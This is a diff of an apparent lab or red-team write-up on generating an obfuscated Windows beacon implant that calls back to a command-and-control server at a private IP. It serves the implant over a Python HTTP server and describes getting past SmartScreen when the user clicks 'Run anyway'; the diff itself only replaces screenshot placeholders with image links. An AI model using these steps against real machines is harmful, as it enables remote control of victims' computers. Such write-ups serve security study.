@@ -6,11 +6,8 @@
 generate beacon --http 192.168.30.138:6789
 --os windows --arch amd64 --save /tmp/beacon.exe
 
-[INSERT SCREENSHOT → PDF showing:
-"Generating new windows/amd64 beacon implant binary"
-"Symbol obfuscation is enabled"
-"Build completed in 41s"
-"Implant saved to /tmp/beacon.exe"]
+<img width="1800" height="204" alt="image" src="https://github.com/user-attachments/assets/c865736e-aa16-4862-9456-6d706084202b" />
+
 
 ## Key Generation Details
 - **Symbol obfuscation enabled** — makes reverse 
@@ -21,15 +18,11 @@ generate beacon --http 192.168.30.138:6789
 ## Delivery via Python HTTP Server
 cd /tmp
 python3 -m http.server 8080
+<img width="1649" height="350" alt="image" src="https://github.com/user-attachments/assets/c93dba57-2c2c-4eac-b9c5-0905c5dd63a2" />
 
-[INSERT SCREENSHOT → PDF showing Python server 
-running with GET requests from 192.168.30.129 
-for beacon.exe — multiple download attempts visible]
 
 ## AV Evasion — SmartScreen Bypass
-[INSERT SCREENSHOT → PDF showing Windows SmartScreen 
-"Windows protected your PC" popup with 
-"Run anyway" button visible]
+<img width="1891" height="820" alt="image" src="https://github.com/user-attachments/assets/58b2b23f-fd13-4481-99a6-de5431a673d2" />
 
 Despite SmartScreen warning, beacon executed 
 successfully when user clicked "Run anyway" — 
